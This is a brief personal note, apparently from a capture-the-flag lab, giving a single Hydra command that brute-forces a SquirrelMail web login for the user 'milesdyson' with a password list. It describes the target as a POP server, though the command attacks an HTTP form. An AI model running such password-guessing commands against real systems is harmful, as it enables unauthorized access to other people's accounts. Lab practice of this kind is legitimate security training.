# Commands for Hydra

command used to login to a pop server
```
hydra -l milesdyson -P log1.txt 10.10.229.129 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```
